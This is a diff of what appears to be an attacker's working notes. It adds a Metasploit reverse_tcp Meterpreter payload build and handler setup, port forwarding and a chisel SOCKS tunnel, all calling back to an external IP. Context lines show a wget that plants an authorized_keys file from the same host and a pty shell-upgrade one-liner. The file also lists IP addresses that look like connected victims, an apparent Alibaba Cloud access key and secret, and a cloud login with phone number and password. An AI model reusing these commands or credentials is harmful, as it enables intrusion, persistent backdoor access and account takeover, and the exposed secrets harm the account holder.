@@ -11,7 +11,7 @@ chmod%20777%20reverse2.sh
 
 wget%2035.236.161.97/authorized_keys%20-O%20
 
-python3 -c "import pty;pty.spawn('/bin/bash')"
+python -c "import pty;pty.spawn('/bin/bash')"
 export TERM=xterm
 ctrl+z
 stty raw -echo && fg
@@ -29,3 +29,26 @@ export TERM=xterm
 阿里云登录帐号:ciyiyy
 手机号：15389054975
 密码：cyyy8821@
+
+
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=35.236.161.97 LPORT=443 -f elf > timmy.elf
+
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+
+portfwd add –l 8090 –p 8090 –r 35.236.161.97
+
+
+chisel client 35.236.161.97:80 R:socks
+
+  
+106.52.241.104:36812 (106.52.241.104)        
+52.82.36.173:39749 (52.82.36.173)            
+1.15.236.30:42361) 
+192.241.216.95:36668) 
+
+
+LTAI5tF8Am9mPNp9DAM8VFjV
+JM7fkPHQhiJomvlrAM0sob6IDCDHCv
